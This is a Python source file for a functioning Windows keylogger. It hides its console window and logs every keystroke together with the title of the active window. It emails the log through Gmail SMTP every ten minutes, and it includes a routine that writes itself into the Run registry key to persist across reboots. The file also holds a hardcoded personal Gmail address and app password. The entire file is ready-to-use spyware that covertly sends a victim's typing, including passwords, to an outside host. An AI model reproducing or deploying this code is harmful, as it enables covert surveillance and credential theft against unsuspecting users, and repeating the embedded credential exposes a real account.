# 
import os
import sys
import time
import smtplib
import threading
from email.mime.text import MIMEText
from pynput import keyboard
from datetime import datetime
import win32gui

# Windows console hiding
if os.name == 'nt':
    import ctypes
    whnd = ctypes.windll.kernel32.GetConsoleWindow()
    if whnd != 0:
        ctypes.windll.user32.ShowWindow(whnd, 0)
        ctypes.windll.kernel32.CloseHandle(whnd)

# Settings
# Settings
log_file = "keylog.txt"
email_interval = 10  # in minutes
sender_email = "benjaminasareagyapong2006@gmail.com"
sender_password ='khas udvk dsjm vxns'
recipient_email = "benjaminasareagyapong2006@gmail.com"

# Buffer and window tracking
log_buffer = []
buffer_limit = 10
last_window = None
start_time = datetime.now()

def write_log(data):
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(data)

def flush_buffer():
    if log_buffer:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        write_log(f"\n[{timestamp}] " + ''.join(log_buffer))
        log_buffer.clear()

def get_active_window_title():
    try:
        if os.name == 'nt':
            
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        else:
            return "ActiveWindow: [Unsupported OS]"
    except:
        return "ActiveWindow: [Error]"

def on_press(key):
    global last_window
    try:
        current_window = get_active_window_title()
        if current_window != last_window:
            last_window = current_window
            log_buffer.append(f"\n\n[Window: {current_window}]\n")

        if hasattr(key, 'char') and key.char is not None:
            log_buffer.append(key.char)
        else:
            key_map = {
                keyboard.Key.space: ' ',
                keyboard.Key.enter: '\n',
                keyboard.Key.tab: '[TAB]',
                keyboard.Key.backspace: '[BACKSPACE]',
                keyboard.Key.esc: '[ESC]',
            }
            log_buffer.append(key_map.get(key, f"[{key}]"))

        if len(log_buffer) >= buffer_limit:
            flush_buffer()
    except Exception as e:
        write_log(f"\n[ERROR] {str(e)}")

def on_release(key):
    if key == keyboard.Key.esc:
        flush_buffer()
        write_log(f"\n[Session ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
        return False

def send_email_log(sender, password, recipient):
    try:
        with open(log_file, "r", encoding="utf-8") as f:
            content = f.read()

        if not content.strip():
            return

        msg = MIMEText(content)
        msg["Subject"] = "Keylogger Logs"
        msg["From"] = sender
        msg["To"] = recipient

        server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
        server.login(sender, password)
        server.send_message(msg)
        server.quit()
        print("[INFO] Email sent.")
    except Exception as e:
        print(f"[ERROR] Email not sent: {e}")

def start_email_timer(interval_minutes, sender, password, recipient):
    def email_loop():
        while True:
            flush_buffer()
            send_email_log(sender, password, recipient)
            time.sleep(interval_minutes * 60)
    threading.Thread(target=email_loop, daemon=True).start()

def add_to_startup(exe_path):
    if os.name != 'nt':
        return
    try:
        import winreg
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "MyKeylogger", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
    except Exception as e:
        write_log(f"\n[Startup Error] {e}")

# Start session log
write_log(f"\n[Session started at {start_time.strftime('%Y-%m-%d %H:%M:%S')}]\n")

# OPTIONAL: Add to startup (requires exe path)
#Uncomment this after building the .exe with pyinstaller
# add_to_startup(os.path.abspath(sys.argv[0]))

# Start email sender thread
start_email_timer(email_interval, sender_email, sender_password, recipient_email)

# Start keylogger listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()